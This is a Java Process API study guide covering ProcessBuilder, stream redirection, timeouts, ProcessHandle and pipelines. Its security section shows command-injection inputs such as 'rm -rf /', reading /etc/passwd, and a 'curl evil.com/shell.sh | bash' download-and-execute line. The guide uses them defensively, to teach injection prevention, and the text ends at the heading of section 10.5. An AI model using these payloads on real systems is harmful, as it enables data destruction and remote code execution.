# Java Process API — Complete Study Guide

> **Module 13 | Brutally Detailed Reference**
> Covers ProcessBuilder, Process, ProcessHandle (Java 9+), pipeline construction, I/O redirection, and security hardening against command injection. Every section includes full working examples.

---

## Table of Contents

1. [Overview — The Java Process API](#1-overview--the-java-process-api)
2. [ProcessBuilder — Creating and Configuring OS Processes](#2-processbuilder--creating-and-configuring-os-processes)
3. [Setting Command, Arguments, Working Directory, Environment Variables](#3-setting-command-arguments-working-directory-environment-variables)
4. [Redirecting stdin, stdout, stderr](#4-redirecting-stdin-stdout-stderr)
5. [Reading Process Output — getInputStream() / getErrorStream()](#5-reading-process-output--getinputstream--geterrorstream)
6. [process.waitFor() and process.waitFor(timeout, unit)](#6-processwaitfor-and-processwaitfortimeout-unit)
7. [process.destroyForcibly() — Killing Processes](#7-processdestroyforcibly--killing-processes)
8. [ProcessHandle (Java 9+)](#8-processhandle-java-9)
9. [Piping Processes — ProcessBuilder.startPipeline()](#9-piping-processes--processbuilderstartpipeline)
10. [Security — Command Injection Risk](#10-security--command-injection-risk)
11. [Additional Topics](#11-additional-topics)
12. [Quick Reference Cheat Sheet](#12-quick-reference-cheat-sheet)

---

## 1. Overview — The Java Process API

Java's Process API allows you to **spawn, communicate with, monitor, and terminate** operating system processes from within a Java program. The API spans two generations:

| Class / Interface | Since | Purpose |
|---|---|---|
| `Runtime.exec()` | Java 1.0 | Legacy, low-level, error-prone |
| `ProcessBuilder` | Java 5 | Modern process creation and configuration |
| `Process` | Java 1.0 (improved Java 9) | Handle to a running OS process |
| `ProcessHandle` | Java 9 | Inspect and manage any OS process by PID |
| `ProcessHandle.Info` | Java 9 | Metadata about a running process |

### The Process Lifecycle

```
ProcessBuilder.start()
        │
        ▼
  ┌─────────────┐     getInputStream()   ┌───────────────┐
  │             │ ──────────────────────► │  Java reads   │
  │  OS Process │     getOutputStream()  │  process      │
  │  (child)    │ ◄────────────────────── │  output       │
  │             │     getErrorStream()   └───────────────┘
  └──────┬──────┘
         │
         ▼
  waitFor() / exitValue()
         │
         ▼
  destroy() / destroyForcibly()
```

### Core Principle — Always Read Output

A critically important rule: if your process writes to stdout or stderr and you **don't read it**, the process will **block** when the OS pipe buffer fills up (typically 4–64 KB). Both the child process and the parent Java program will deadlock. This is one of the most common bugs when using the Process API.

---

## 2. ProcessBuilder — Creating and Configuring OS Processes

`ProcessBuilder` is a mutable configuration object. You set it up, then call `start()` to launch the process.

### 2.1 Basic Construction

```java
// Constructor takes varargs: command + arguments
ProcessBuilder pb = new ProcessBuilder("ls", "-la", "/tmp");

// Or a List<String>
List<String> cmd = Arrays.asList("git", "log", "--oneline", "-10");
ProcessBuilder pb2 = new ProcessBuilder(cmd);
```

### 2.2 `start()` — Launch the Process

Calling `start()` is what actually creates the OS process. It returns a `Process` object.

```java
ProcessBuilder pb = new ProcessBuilder("echo", "Hello from OS");
try {
    Process process = pb.start();
    // read output, wait, etc.
} catch (IOException e) {
    // thrown if the executable is not found or not executable
    e.printStackTrace();
}
```

### 2.3 `command()` — Get or Set the Command

```java
ProcessBuilder pb = new ProcessBuilder("echo", "hello");
System.out.println(pb.command()); // [echo, hello]

pb.command("ping", "-c", "3", "google.com");
System.out.println(pb.command()); // [ping, -c, 3, google.com]

// Replace entire command list
pb.command(List.of("java", "-version"));
```

### 2.4 Full Minimal Example

```java
import java.io.*;
import java.util.*;

public class BasicProcess {
    public static void main(String[] args) throws Exception {
        ProcessBuilder pb = new ProcessBuilder("echo", "Hello, World!");
        pb.redirectErrorStream(true); // merge stderr into stdout

        Process process = pb.start();

        // Read all output
        String output = new String(process.getInputStream().readAllBytes());
        int exitCode = process.waitFor();

        System.out.println("Output:    " + output.trim()); // Hello, World!
        System.out.println("Exit code: " + exitCode);       // 0
    }
}
```

---

## 3. Setting Command, Arguments, Working Directory, Environment Variables

### 3.1 Command and Arguments — Critical Rule: No Shell

`ProcessBuilder` does **not** invoke a shell by default. Each argument must be a separate element in the list. Shell features like pipes (`|`), redirections (`>`), glob expansion (`*`), variable substitution (`$VAR`) do **not** work unless you explicitly invoke a shell.

```java
// WRONG — passes entire string as one argument to 'ls'
new ProcessBuilder("ls -la /tmp"); // looks for executable literally named "ls -la /tmp"

// CORRECT — separate arguments
new ProcessBuilder("ls", "-la", "/tmp");

// If you NEED shell features (use with caution — see Section 10):
// Linux/macOS:
new ProcessBuilder("/bin/sh", "-c", "ls -la /tmp | grep java");
// Windows:
new ProcessBuilder("cmd.exe", "/c", "dir /b C:\\Windows");
```

### 3.2 Working Directory — `directory()`

Sets the working directory for the child process. Defaults to the JVM's current working directory.

```java
ProcessBuilder pb = new ProcessBuilder("mvn", "clean", "install");
pb.directory(new File("/home/user/my-project"));

// Verify it was set
System.out.println(pb.directory()); // /home/user/my-project

// Reset to JVM's working directory
pb.directory(null); // null means use JVM's cwd

// Practical: run git commands in a specific repo
ProcessBuilder git = new ProcessBuilder("git", "status");
git.directory(new File("/path/to/repo"));
Process p = git.start();
```

### 3.3 Environment Variables — `environment()`

Returns a **live mutable `Map<String, String>`** of the environment that will be passed to the child process. Initially it is a copy of the current JVM's environment.

```java
ProcessBuilder pb = new ProcessBuilder("printenv");

Map<String, String> env = pb.environment();

// Inspect current environment
System.out.println("JAVA_HOME: " + env.get("JAVA_HOME"));
System.out.println("PATH:      " + env.get("PATH"));

// Add a new variable
env.put("MY_VAR", "hello_world");
env.put("APP_ENV", "production");

// Modify existing variable — append to PATH
String path = env.get("PATH");
env.put("PATH", path + File.pathSeparator + "/opt/mytools/bin");

// Remove a variable
env.remove("UNWANTED_VAR");

// Start with CLEAN environment (only what you set)
env.clear();
env.put("PATH", "/usr/bin:/bin");
env.put("HOME", "/tmp/sandbox");

Process process = pb.start();
```

### 3.4 Full Configuration Example

```java
public class FullConfig {
    public static void main(String[] args) throws Exception {
        ProcessBuilder pb = new ProcessBuilder(
            "java",
            "-Xmx256m",
            "-jar",
            "my-app.jar",
            "--port=8080"
        );

        // Set working directory
        pb.directory(new File("/opt/apps/my-app"));

        // Configure environment
        Map<String, String> env = pb.environment();
        env.put("APP_ENV", "production");
        env.put("DB_URL", "jdbc:postgresql://localhost/mydb");
        env.put("LOG_LEVEL", "INFO");

        // Merge stderr with stdout
        pb.redirectErrorStream(true);

        // Start it
        Process process = pb.start();

        // Stream output in a background thread
        Thread reader = new Thread(() -> {
            try (BufferedReader br = new BufferedReader(
                    new InputStreamReader(process.getInputStream()))) {
                br.lines().forEach(System.out::println);
            } catch (IOException e) {
                e.printStackTrace();
            }
        });
        reader.start();

        int exit = process.waitFor();
        reader.join();
        System.out.println("Process exited with code: " + exit);
    }
}
```

---

## 4. Redirecting stdin, stdout, stderr

`ProcessBuilder` can redirect the standard streams of the child process to/from files or merge them together, **before** the process starts.

### 4.1 `ProcessBuilder.Redirect` — The Redirect Type

`ProcessBuilder.Redirect` is a sealed abstract class with factory methods and constants:

| Redirect | Meaning |
|---|---|
| `Redirect.PIPE` (default) | Connect stream to Java via `getInputStream()`/`getOutputStream()` |
| `Redirect.INHERIT` | Child inherits the JVM's own stdin/stdout/stderr (shares the console) |
| `Redirect.DISCARD` | Output is discarded (sent to `/dev/null`) — Java 9+ |
| `Redirect.from(file)` | Read stdin from a file |
| `Redirect.to(file)` | Write stdout/stderr to a file (overwrite) |
| `Redirect.appendTo(file)` | Append stdout/stderr to a file |

### 4.2 `redirectOutput(Redirect)` — Redirect stdout

```java
File outFile = new File("output.txt");

// Write stdout to a file (overwrite)
ProcessBuilder pb = new ProcessBuilder("ls", "-la");
pb.redirectOutput(Redirect.to(outFile));

// Append stdout to a file
pb.redirectOutput(Redirect.appendTo(outFile));

// Inherit JVM's stdout (process output appears in console directly)
pb.redirectOutput(Redirect.INHERIT);

// Discard stdout (Java 9+)
pb.redirectOutput(Redirect.DISCARD);

// Convenience shortcut — same as Redirect.to(file):
pb.redirectOutput(outFile); // overload that accepts File directly
```

### 4.3 `redirectInput(Redirect)` — Redirect stdin

```java
File inputFile = new File("input.txt");

// Read stdin from a file
ProcessBuilder pb = new ProcessBuilder("sort");
pb.redirectInput(Redirect.from(inputFile));
// shortcut:
pb.redirectInput(inputFile);

// Inherit JVM's stdin
pb.redirectInput(Redirect.INHERIT);
```

### 4.4 `redirectError(Redirect)` — Redirect stderr

```java
File errFile = new File("errors.log");
pb.redirectError(Redirect.to(errFile));
pb.redirectError(Redirect.appendTo(errFile));
pb.redirectError(Redirect.INHERIT);
pb.redirectError(Redirect.DISCARD); // Java 9+ — silently discard errors
```

### 4.5 `redirectErrorStream(boolean)` — Merge stderr into stdout

The most commonly used redirect. When `true`, stderr is merged into stdout so you only have one stream to read.

```java
ProcessBuilder pb = new ProcessBuilder("javac", "MyClass.java");
pb.redirectErrorStream(true); // compiler errors come through getInputStream()

Process p = pb.start();
String output = new String(p.getInputStream().readAllBytes());
// Contains both normal output AND error messages
```

`redirectErrorStream(true)` is **mutually exclusive** with `redirectError()` — setting one overrides the other.

### 4.6 Checking Current Redirects — `redirectInput()`, `redirectOutput()`, `redirectError()`

Called with no arguments, these return the current `Redirect` configuration:

```java
ProcessBuilder pb = new ProcessBuilder("ls");
System.out.println(pb.redirectInput());  // PIPE
System.out.println(pb.redirectOutput()); // PIPE
System.out.println(pb.redirectError());  // PIPE
```

### 4.7 Full Redirect Example — Separate stdout and stderr to files

```java
public class SeparateRedirects {
    public static void main(String[] args) throws Exception {
        File stdout = new File("stdout.log");
        File stderr = new File("stderr.log");

        ProcessBuilder pb = new ProcessBuilder("javac", "NonExistentFile.java");
        pb.redirectOutput(Redirect.to(stdout)); // normal output → stdout.log
        pb.redirectError(Redirect.to(stderr));  // error output → stderr.log

        Process p = pb.start();
        int exit = p.waitFor();

        System.out.println("Exit: " + exit);
        System.out.println("stdout.log: " + Files.readString(stdout.toPath()));
        System.out.println("stderr.log: " + Files.readString(stderr.toPath()));
        // stderr.log will contain: error: file not found: NonExistentFile.java
    }
}
```

### 4.8 `inheritIO()` — Inherit All Three Streams at Once

A convenience method that sets stdin, stdout, and stderr all to `INHERIT`:

```java
ProcessBuilder pb = new ProcessBuilder("top", "-n", "1");
pb.inheritIO(); // child process shares the JVM's console — output appears directly

Process p = pb.start();
p.waitFor(); // output streams straight to your terminal
```

---

## 5. Reading Process Output — `getInputStream()` / `getErrorStream()`

These methods exist on the `Process` object (not `ProcessBuilder`). They give you Java `InputStream` objects connected to the child process's stdout and stderr.

> **Naming confusion:** `process.getInputStream()` gives you the process's **stdout** (you *read* it as input to Java). `process.getOutputStream()` gives you the process's **stdin** (you *write* to it from Java).

### 5.1 `process.getInputStream()` — Read stdout

```java
Process p = new ProcessBuilder("ls", "-la").start();

// Simple: read all at once (only safe for small output)
byte[] bytes = p.getInputStream().readAllBytes();
String output = new String(bytes, StandardCharsets.UTF_8);
System.out.println(output);
```

### 5.2 Reading Line by Line with `BufferedReader`

```java
Process p = new ProcessBuilder("ps", "aux").start();

try (BufferedReader reader = new BufferedReader(
        new InputStreamReader(p.getInputStream(), StandardCharsets.UTF_8))) {
    String line;
    while ((line = reader.readLine()) != null) {
        System.out.println(">>> " + line);
    }
}
p.waitFor();
```

### 5.3 `process.getErrorStream()` — Read stderr Separately

```java
ProcessBuilder pb = new ProcessBuilder("ls", "/nonexistent");
pb.redirectErrorStream(false); // keep streams separate (default)

Process p = pb.start();

// Must read BOTH streams concurrently to avoid deadlock!
// If stderr fills up while you're blocking on stdout.readAllBytes(), you deadlock.

// Read stderr in a background thread
String[] stderrHolder = new String[1];
Thread errThread = new Thread(() -> {
    try {
        stderrHolder[0] = new String(p.getErrorStream().readAllBytes());
    } catch (IOException e) { e.printStackTrace(); }
});
errThread.start();

// Read stdout in main thread
String stdout = new String(p.getInputStream().readAllBytes());

errThread.join();
p.waitFor();

System.out.println("stdout: " + stdout);
System.out.println("stderr: " + stderrHolder[0]);
```

### 5.4 `process.getOutputStream()` — Write to stdin

Lets you send data to the process's standard input:

```java
// Run 'cat' which echoes whatever it receives on stdin
Process p = new ProcessBuilder("cat").start();

// Write to process stdin
try (PrintWriter writer = new PrintWriter(
        new OutputStreamWriter(p.getOutputStream(), StandardCharsets.UTF_8))) {
    writer.println("Line 1 sent to process");
    writer.println("Line 2 sent to process");
    // CRITICAL: close the stream to signal EOF to the process
}

// Read what cat echoed back
String output = new String(p.getInputStream().readAllBytes());
System.out.println(output);
p.waitFor();
```

### 5.5 The Deadlock Problem — Always Use Threads

The classic deadlock scenario:

```
Main thread:  p.getInputStream().readAllBytes()  ← blocks, waiting for process to finish
Child process: waiting for stderr pipe buffer to drain ← blocks, waiting for Java to read stderr
Result: both sides wait forever — DEADLOCK
```

**Safe pattern — always read both streams in parallel:**

```java
public static ProcessResult runProcess(List<String> command) throws Exception {
    ProcessBuilder pb = new ProcessBuilder(command);
    Process p = pb.start();

    // Collect stdout in background thread
    StringBuilder stdout = new StringBuilder();
    Thread outThread = new Thread(() -> {
        try (BufferedReader br = new BufferedReader(
                new InputStreamReader(p.getInputStream()))) {
            br.lines().forEach(line -> stdout.append(line).append('\n'));
        } catch (IOException e) { /* handle */ }
    });

    // Collect stderr in background thread
    StringBuilder stderr = new StringBuilder();
    Thread errThread = new Thread(() -> {
        try (BufferedReader br = new BufferedReader(
                new InputStreamReader(p.getErrorStream()))) {
            br.lines().forEach(line -> stderr.append(line).append('\n'));
        } catch (IOException e) { /* handle */ }
    });

    outThread.start();
    errThread.start();

    int exitCode = p.waitFor();
    outThread.join();
    errThread.join();

    return new ProcessResult(exitCode, stdout.toString(), stderr.toString());
}

record ProcessResult(int exitCode, String stdout, String stderr) {}
```

### 5.6 Reading with `redirectErrorStream(true)` — The Simple Path

If you merge stderr into stdout, you only have one stream to read and deadlock is impossible:

```java
ProcessBuilder pb = new ProcessBuilder("git", "status");
pb.directory(new File("/path/to/repo"));
pb.redirectErrorStream(true); // merge stderr → stdout

Process p = pb.start();
String output = new String(p.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
int exit = p.waitFor();
```

### 5.7 Streaming Output in Real-Time (Long-Running Processes)

For processes that run a long time and produce continuous output:

```java
ProcessBuilder pb = new ProcessBuilder("ping", "-c", "5", "google.com");
pb.redirectErrorStream(true);

Process p = pb.start();

// Stream output line by line as it arrives
try (BufferedReader reader = new BufferedReader(
        new InputStreamReader(p.getInputStream()))) {
    String line;
    while ((line = reader.readLine()) != null) {
        System.out.println("[" + Instant.now() + "] " + line);
    }
}

int exit = p.waitFor();
System.out.println("Done. Exit: " + exit);
```

---

## 6. `process.waitFor()` and `process.waitFor(timeout, unit)`

### 6.1 `waitFor()` — Block Until Process Exits

Causes the current thread to wait until the process terminates. Returns the exit value (0 = success by convention; non-zero = error).

```java
Process p = new ProcessBuilder("sleep", "2").start();

System.out.println("Waiting...");
int exitCode = p.waitFor(); // blocks for ~2 seconds
System.out.println("Exit code: " + exitCode); // 0
```

`waitFor()` throws `InterruptedException` if the waiting thread is interrupted. Always handle it:

```java
Process p = pb.start();
try {
    int exit = p.waitFor();
    System.out.println("Exit: " + exit);
} catch (InterruptedException e) {
    Thread.currentThread().interrupt(); // restore interrupted status
    p.destroy();                        // kill the child process
    throw new RuntimeException("Process interrupted", e);
}
```

### 6.2 `waitFor(long timeout, TimeUnit unit)` — Wait with Timeout

Java 8+. Returns `true` if the process exited within the timeout, `false` if it timed out.

```java
Process p = new ProcessBuilder("sleep", "60").start();

boolean finished = p.waitFor(5, TimeUnit.SECONDS);

if (finished) {
    System.out.println("Process finished with exit code: " + p.exitValue());
} else {
    System.out.println("Process timed out — killing it");
    p.destroyForcibly();
    // Optionally wait for destruction to complete
    p.waitFor(2, TimeUnit.SECONDS);
}
```

### 6.3 `exitValue()` — Non-Blocking Exit Code Check

Returns the exit value immediately. Throws `IllegalThreadStateException` if the process has not yet terminated.

```java
Process p = pb.start();

// Check without blocking
try {
    int code = p.exitValue();
    System.out.println("Already done: " + code);
} catch (IllegalThreadStateException e) {
    System.out.println("Process still running");
}
```

### 6.4 `isAlive()` — Java 8+ Non-Blocking Status Check

```java
Process p = pb.start();

while (p.isAlive()) {
    System.out.println("Still running...");
    Thread.sleep(500);
}
System.out.println("Done. Exit: " + p.exitValue());
```

### 6.5 Full Timeout Pattern with Cleanup

```java
public static int runWithTimeout(List<String> command, long timeoutSeconds) 
        throws IOException, InterruptedException {

    ProcessBuilder pb = new ProcessBuilder(command);
    pb.redirectErrorStream(true);
    Process p = pb.start();

    // Drain output in background (prevent pipe buffer deadlock)
    Thread drainer = new Thread(() -> {
        try { p.getInputStream().transferTo(OutputStream.nullOutputStream()); }
        catch (IOException ignored) {}
    });
    drainer.setDaemon(true);
    drainer.start();

    try {
        boolean completed = p.waitFor(timeoutSeconds, TimeUnit.SECONDS);
        if (!completed) {
            System.err.println("Process timed out after " + timeoutSeconds + "s");
            p.destroyForcibly();
            p.waitFor(5, TimeUnit.SECONDS); // wait for destruction
            return -1;
        }
        return p.exitValue();
    } catch (InterruptedException e) {
        Thread.currentThread().interrupt();
        p.destroyForcibly();
        throw e;
    }
}
```

---

## 7. `process.destroyForcibly()` — Killing Processes

### 7.1 `destroy()` vs `destroyForcibly()`

| Method | Behavior |
|---|---|
| `process.destroy()` | Sends a **graceful** termination signal (`SIGTERM` on Unix, `TerminateProcess` on Windows). The process may catch it and ignore it. |
| `process.destroyForcibly()` | Sends a **forceful** kill signal (`SIGKILL` on Unix). Cannot be caught or ignored. Returns `Process` for chaining. |

```java
Process p = new ProcessBuilder("sleep", "100").start();

// Graceful — process may handle cleanup
p.destroy();

// Check if it died
if (p.isAlive()) {
    System.out.println("Process ignored SIGTERM — force killing");
    p.destroyForcibly();
}
```

### 7.2 Best Practice — Try Graceful, Then Force

```java
public static void killProcess(Process p) throws InterruptedException {
    if (!p.isAlive()) return;

    // Step 1: request graceful shutdown
    p.destroy();

    // Step 2: wait up to 3 seconds for graceful exit
    boolean graceful = p.waitFor(3, TimeUnit.SECONDS);

    // Step 3: force kill if still running
    if (!graceful && p.isAlive()) {
        System.err.println("Process did not exit gracefully — force killing (PID: "
            + p.pid() + ")");
        p.destroyForcibly();
        p.waitFor(2, TimeUnit.SECONDS);
    }

    System.out.println("Process killed. Exit value: " + p.exitValue());
}
```

### 7.3 `process.pid()` — Java 9+: Get the OS Process ID

```java
Process p = new ProcessBuilder("sleep", "30").start();
System.out.println("Spawned PID: " + p.pid()); // e.g., 12345
```

### 7.4 Shutdown Hook — Kill Children on JVM Exit

Register a shutdown hook to ensure child processes are terminated if the JVM is killed:

```java
Process p = pb.start();

Runtime.getRuntime().addShutdownHook(new Thread(() -> {
    if (p.isAlive()) {
        System.err.println("JVM shutting down — killing child process PID: " + p.pid());
        p.destroyForcibly();
    }
}));
```

---

## 8. `ProcessHandle` (Java 9+)

`ProcessHandle` is a Java 9+ interface that provides a rich API for inspecting and managing **any** OS process — not just ones you spawned yourself. It identifies processes by their OS PID.

### 8.1 `ProcessHandle.current()` — Current JVM Process

Returns a `ProcessHandle` representing the currently running JVM process.

```java
ProcessHandle self = ProcessHandle.current();

System.out.println("JVM PID:  " + self.pid());
System.out.println("Is alive: " + self.isAlive());

ProcessHandle.Info info = self.info();
info.command().ifPresent(cmd -> System.out.println("Command: " + cmd));
info.user().ifPresent(user -> System.out.println("User:    " + user));
info.startInstant().ifPresent(t -> System.out.println("Started: " + t));
info.totalCpuDuration().ifPresent(d -> System.out.println("CPU:     " + d));
```

### 8.2 `ProcessHandle.of(pid)` — Get Handle by PID

```java
long targetPid = 1234L; // some OS process PID
Optional<ProcessHandle> handle = ProcessHandle.of(targetPid);

handle.ifPresentOrElse(
    ph -> System.out.println("Found process: " + ph.pid() + " alive=" + ph.isAlive()),
    ()  -> System.out.println("No process with PID " + targetPid)
);
```

### 8.3 `ProcessHandle.allProcesses()` — Stream of All OS Processes

Returns a snapshot `Stream<ProcessHandle>` of all processes visible to the current JVM (subject to OS permissions).

```java
// List all running Java processes
System.out.println("=== Java Processes ===");
ProcessHandle.allProcesses()
    .filter(ph -> ph.info().command()
        .map(cmd -> cmd.contains("java"))
        .orElse(false))
    .forEach(ph -> {
        ProcessHandle.Info info = ph.info();
        System.out.printf("PID: %6d  CMD: %s%n",
            ph.pid(),
            info.command().orElse("unknown"));
    });

// Count total visible processes
long count = ProcessHandle.allProcesses().count();
System.out.println("Total visible processes: " + count);

// Find processes by name
ProcessHandle.allProcesses()
    .filter(ph -> ph.info().command()
        .map(c -> c.endsWith("nginx"))
        .orElse(false))
    .map(ProcessHandle::pid)
    .forEach(pid -> System.out.println("nginx PID: " + pid));
```

### 8.4 `ProcessHandle.Info` — Process Metadata

`ProcessHandle.Info` is a snapshot of process metadata. All fields are `Optional` because they may not be available on all OS/permission levels.

```java
ProcessHandle ph = ProcessHandle.current();
ProcessHandle.Info info = ph.info();

// Command: the executable path
Optional<String> command = info.command();
command.ifPresent(c -> System.out.println("Command:    " + c));

// Arguments: the command-line arguments
Optional<String[]> args = info.arguments();
args.ifPresent(a -> System.out.println("Arguments:  " + Arrays.toString(a)));

// commandLine(): command + arguments as a single string (Java 9+)
Optional<String> cmdLine = info.commandLine();
cmdLine.ifPresent(cl -> System.out.println("CmdLine:    " + cl));

// User: OS user running the process
Optional<String> user = info.user();
user.ifPresent(u -> System.out.println("User:       " + u));

// Start time
Optional<Instant> start = info.startInstant();
start.ifPresent(t -> System.out.println("Started:    " + t));

// Total CPU time consumed
Optional<Duration> cpu = info.totalCpuDuration();
cpu.ifPresent(d -> System.out.printf("CPU usage:  %.3f seconds%n", d.toMillis() / 1000.0));
```

### 8.5 `process.toHandle()` — Get Handle from a Spawned Process

Bridges `Process` and `ProcessHandle`:

```java
Process p = new ProcessBuilder("sleep", "30").start();

ProcessHandle handle = p.toHandle();
System.out.println("PID: " + handle.pid()); // same as p.pid()
System.out.println("Alive: " + handle.isAlive());
```

### 8.6 `process.toHandle().onExit()` — `CompletableFuture` for Completion

`onExit()` returns a `CompletableFuture<ProcessHandle>` that completes when the process exits. This allows fully **non-blocking, asynchronous** process management.

```java
Process p = new ProcessBuilder("sleep", "2").start();

CompletableFuture<ProcessHandle> future = p.toHandle().onExit();

// React asynchronously when process finishes
future.thenAccept(ph -> {
    System.out.println("Process " + ph.pid() + " finished!");
    System.out.println("Exit code: " + p.exitValue());
});

System.out.println("Process started, doing other work...");
Thread.sleep(3000); // simulate other work
```

#### `process.onExit()` Shortcut (Java 9+)

`Process` itself also has `onExit()` which returns `CompletableFuture<Process>`:

```java
Process p = new ProcessBuilder("ls", "-la").start();
pb.redirectErrorStream(true);

// Chain async operations
p.onExit()
 .thenApply(proc -> {
     try {
         return new String(proc.getInputStream().readAllBytes());
     } catch (IOException e) {
         throw new RuntimeException(e);
     }
 })
 .thenAccept(output -> System.out.println("Output: " + output))
 .exceptionally(ex -> {
     System.err.println("Error: " + ex.getMessage());
     return null;
 });

// Wait for the future to complete (only needed if main thread would exit)
p.onExit().join();
```

### 8.7 Parent and Children of a Process

```java
ProcessHandle ph = ProcessHandle.current();

// Get the parent process
Optional<ProcessHandle> parent = ph.parent();
parent.ifPresent(p -> System.out.println("Parent PID: " + p.pid()));

// Get direct children
System.out.println("Direct children:");
ph.children().forEach(child ->
    System.out.println("  Child PID: " + child.pid()));

// Get all descendants (recursive)
System.out.println("All descendants:");
ph.descendants().forEach(desc ->
    System.out.println("  Descendant PID: " + desc.pid()));
```

### 8.8 Full ProcessHandle Example — Process Monitor

```java
import java.lang.ProcessHandle;
import java.time.*;
import java.util.*;

public class ProcessMonitor {
    public static void main(String[] args) throws Exception {
        // Launch a child process
        Process child = new ProcessBuilder("sleep", "10").start();
        ProcessHandle handle = child.toHandle();

        System.out.printf("Launched PID: %d%n", handle.pid());

        // Monitor it in background
        handle.onExit().thenAccept(ph -> {
            System.out.printf("%nProcess %d has exited. Exit code: %d%n",
                ph.pid(), child.exitValue());
        });

        // Print info every second for 3 seconds
        for (int i = 0; i < 3; i++) {
            Thread.sleep(1000);
            ProcessHandle.Info info = handle.info();

            System.out.printf("[%ds] PID=%d alive=%b cpu=%s%n",
                i + 1,
                handle.pid(),
                handle.isAlive(),
                info.totalCpuDuration().map(Duration::toString).orElse("N/A")
            );
        }

        // Kill it
        child.destroy();
        child.onExit().join();
    }
}
```

---

## 9. Piping Processes — `ProcessBuilder.startPipeline()`

### 9.1 Why Piping Is Tricky Without `startPipeline()`

Before Java 9, connecting processes like `cmd1 | cmd2 | cmd3` required you to manually wire the `OutputStream` of one process to the `InputStream` of the next in separate threads — complex and error-prone.

### 9.2 `ProcessBuilder.startPipeline(List<ProcessBuilder>)` — Java 9+

`startPipeline()` is a static factory method that creates a chain of processes where each process's stdout is wired to the next process's stdin automatically. Returns a `List<Process>`.

```java
import java.lang.ProcessBuilder;
import java.util.List;

public class PipelineDemo {
    public static void main(String[] args) throws Exception {

        // Equivalent shell command: ls -la | grep ".java" | wc -l
        List<ProcessBuilder> pipeline = List.of(
            new ProcessBuilder("ls", "-la"),
            new ProcessBuilder("grep", ".java"),
            new ProcessBuilder("wc", "-l")
        );

        List<Process> processes = ProcessBuilder.startPipeline(pipeline);

        // The LAST process has the final output — read from it
        Process last = processes.get(processes.size() - 1);
        String result = new String(last.getInputStream().readAllBytes());
        System.out.println("Java files found: " + result.trim());

        // Wait for ALL processes
        for (Process p : processes) {
            p.waitFor();
        }
    }
}
```

### 9.3 How `startPipeline()` Works Internally

- The **first** process in the list has its stdin unmodified (PIPE — you can write to it, or it reads from the terminal).
- **Intermediate** processes have stdout wired to the next process's stdin automatically.
- The **last** process has its stdout unmodified (PIPE — you read the final output from it).
- stderr of each process remains separate and is **not** piped (handle it individually or with `redirectErrorStream(true)` per builder).

### 9.4 Redirecting Input/Output of the Pipeline

```java
// Read the first process's input from a file
ProcessBuilder first = new ProcessBuilder("sort");
first.redirectInput(new File("unsorted.txt")); // feed from file

// Write the last process's output to a file
ProcessBuilder last = new ProcessBuilder("uniq");
last.redirectOutput(new File("deduped.txt")); // write final output to file

List<Process> processes = ProcessBuilder.startPipeline(List.of(first, last));
for (Process p : processes) p.waitFor();
// Result: unsorted.txt → sort → uniq → deduped.txt
```

### 9.5 Handling stderr in a Pipeline

```java
List<ProcessBuilder> builders = List.of(
    new ProcessBuilder("cmd1").redirectErrorStream(true),
    new ProcessBuilder("cmd2").redirectErrorStream(true),
    new ProcessBuilder("cmd3").redirectErrorStream(true)
);

List<Process> processes = ProcessBuilder.startPipeline(builders);
Process last = processes.get(processes.size() - 1);

// Read combined stdout+stderr from last process
String output = new String(last.getInputStream().readAllBytes());
for (Process p : processes) p.waitFor();
```

### 9.6 Real-World Pipeline Example — grep + sort + head

```java
public class LogAnalyzer {
    public static void main(String[] args) throws Exception {
        // Find all ERROR lines, sort them, take top 20
        // Equivalent: grep "ERROR" app.log | sort | head -n 20

        List<ProcessBuilder> pipeline = List.of(
            new ProcessBuilder("grep", "ERROR", "app.log"),
            new ProcessBuilder("sort"),
            new ProcessBuilder("head", "-n", "20")
        );

        List<Process> processes = ProcessBuilder.startPipeline(pipeline);

        Process last = processes.get(processes.size() - 1);
        try (BufferedReader reader = new BufferedReader(
                new InputStreamReader(last.getInputStream()))) {
            reader.lines().forEach(System.out::println);
        }

        for (Process p : processes) {
            p.waitFor();
            System.out.println("Exit: " + p.exitValue());
        }
    }
}
```

### 9.7 Manual Pipeline (Pre-Java 9 Approach)

For reference — shows why `startPipeline()` was a welcome addition:

```java
// Manual pipe: ls | grep java (pre-Java 9 style)
Process ls = new ProcessBuilder("ls").start();
Process grep = new ProcessBuilder("grep", "java").start();

// Pipe ls stdout → grep stdin in a background thread
Thread pipeThread = new Thread(() -> {
    try {
        ls.getInputStream().transferTo(grep.getOutputStream());
        grep.getOutputStream().close(); // signal EOF to grep
    } catch (IOException e) {
        e.printStackTrace();
    }
});
pipeThread.start();

String result = new String(grep.getInputStream().readAllBytes());
ls.waitFor();
grep.waitFor();
pipeThread.join();
System.out.println(result);
```

---

## 10. Security — Command Injection Risk

### 10.1 What Is Command Injection?

Command injection occurs when **user-supplied data** is incorporated into an OS command without sanitization, allowing an attacker to execute arbitrary commands on the server.

This is the **OS-level equivalent of SQL injection**.

### 10.2 The Vulnerable Pattern

The problem arises when you invoke a **shell** (e.g., `/bin/sh -c`) and embed unsanitized user input into the command string:

```java
// VULNERABLE — DO NOT DO THIS
public void searchFiles(String userFilename) throws Exception {
    // Attacker supplies: "irrelevant; rm -rf /"
    String command = "find /uploads -name " + userFilename;
    ProcessBuilder pb = new ProcessBuilder("/bin/sh", "-c", command);
    pb.start();
    // The shell splits and executes: find /uploads -name irrelevant ; rm -rf /
    // The rm -rf / executes as a separate command!
}
```

### 10.3 Attack Examples

| User Input | Shell Executes |
|---|---|
| `file; rm -rf /` | `find . -name file` **and** `rm -rf /` |
| `$(cat /etc/passwd)` | `find . -name [contents of /etc/passwd]` |
| `\`whoami\`` | Command substitution — executes `whoami` |
| `file && curl evil.com/shell.sh \| bash` | Downloads and executes remote script |
| `'*'` | Glob expansion deletes everything |
| `file > /etc/cron.d/backdoor` | Creates a cron backdoor |

### 10.4 The Safe Pattern — Pass Arguments as Separate List Elements

When you **don't use a shell** and pass each argument as a separate list element, shell metacharacters (`; | > $ & ( ) \` `) are treated as **literal characters**, not interpreted by any shell.

```java
// SAFE — user input is just a string argument, not shell-interpreted
public void searchFiles(String userFilename) throws Exception {
    ProcessBuilder pb = new ProcessBuilder("find", "/uploads", "-name", userFilename);
    // Even if userFilename = "irrelevant; rm -rf /"
    // It is passed as a single argument: find /uploads -name "irrelevant; rm -rf /"
    // find will just look for a file with semicolons in the name — harmless
    Process p = pb.start();
    // ...
}
```

### 10.5 When You MUST Use a Shell — Whitelist Validation

